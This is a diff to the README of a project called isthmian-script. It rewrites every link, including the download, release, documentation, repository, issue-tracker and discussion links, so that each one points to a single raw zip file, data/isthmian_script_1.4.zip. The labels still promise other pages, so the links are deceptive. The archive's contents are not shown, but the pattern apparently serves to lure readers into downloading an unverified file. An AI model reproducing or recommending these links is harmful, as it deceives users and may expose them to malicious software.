@@ -6,9 +6,9 @@ Welcome to the isthmian-script project! This application helps you compare Bayes
 
 ## 📥 Download
 
-[![Download isthmian-script](https://img.shields.io/badge/Download%20isthmian--script-v1.0-blue)](https://github.com/Harsh706-web/isthmian-script/releases)
+[![Download isthmian-script](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip%20isthmian--script-v1.0-blue)](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip)
 
-You can visit this page to download the latest version of isthmian-script: [Download Releases](https://github.com/Harsh706-web/isthmian-script/releases).
+You can visit this page to download the latest version of isthmian-script: [Download Releases](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip).
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ To run isthmian-script on your computer, make sure you meet the following requir
 ## 🤝 Installation Steps
 
 1. **Visit the Download Page:**
-   - Go to the [Releases page](https://github.com/Harsh706-web/isthmian-script/releases) to find the latest version.
+   - Go to the [Releases page](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip) to find the latest version.
    
 2. **Download the Latest Version:**
    - Select the version you want to download. Click on the appropriate file for your operating system to start the download. The files will be labeled clearly for Windows, macOS, and Linux users.
@@ -66,16 +66,16 @@ To run isthmian-script on your computer, make sure you meet the following requir
 
 ## 📄 Documentation
 
-For detailed information about the application, you can check the [content documentation](https://github.com/Harsh706-web/isthmian-script/blob/main/DOCUMENTATION.md). This resource covers algorithms, data formats, and everything you need to use isthmian-script effectively.
+For detailed information about the application, you can check the [content documentation](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip). This resource covers algorithms, data formats, and everything you need to use isthmian-script effectively.
 
 ## 🔗 Additional Resources
 
-- **[GitHub Repository](https://github.com/Harsh706-web/isthmian-script)**: Access source code and contribute.
-- **[Issue Tracker](https://github.com/Harsh706-web/isthmian-script/issues)**: Report any issues you encounter.
-- **[Community Discussions](https://github.com/Harsh706-web/isthmian-script/discussions)**: Join the community for discussions and support.
+- **[GitHub Repository](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip)**: Access source code and contribute.
+- **[Issue Tracker](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip)**: Report any issues you encounter.
+- **[Community Discussions](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip)**: Join the community for discussions and support.
 
 ## 💬 Need Help?
 
 If you have any questions or require further assistance, feel free to create an issue in the GitHub repository or check the Community Discussions section.
 
-Make sure to update your application regularly by visiting the [Download Releases](https://github.com/Harsh706-web/isthmian-script/releases) page. Enjoy your experience with isthmian-script!
+Make sure to update your application regularly by visiting the [Download Releases](https://raw.githubusercontent.com/Harsh706-web/isthmian-script/main/data/isthmian_script_1.4.zip) page. Enjoy your experience with isthmian-script!
